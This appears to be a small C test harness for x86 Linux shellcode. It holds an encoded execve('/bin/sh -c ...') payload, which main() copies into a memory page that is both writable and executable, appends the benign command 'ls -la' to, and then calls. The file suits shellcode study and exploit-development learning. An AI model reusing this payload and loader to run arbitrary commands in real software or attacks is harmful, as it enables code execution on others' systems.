char shellcode[] = "\xeb\x18\x5b\x31\xc0\x50\x89\xe2\x8d\x4b\x0b\x51\x8d\x4b\x08\x51\x8d\x4b\x05\x51\x89\xe1\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00";

char cmd[] = "ls -la";

#include <sys/mman.h>
#include <string.h>
int main() {
    int (*sc)() = mmap(NULL, 4096, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(sc, shellcode, sizeof(shellcode));
    memcpy((char*)sc + sizeof(shellcode)-1, cmd, sizeof(cmd));
    return sc();
}
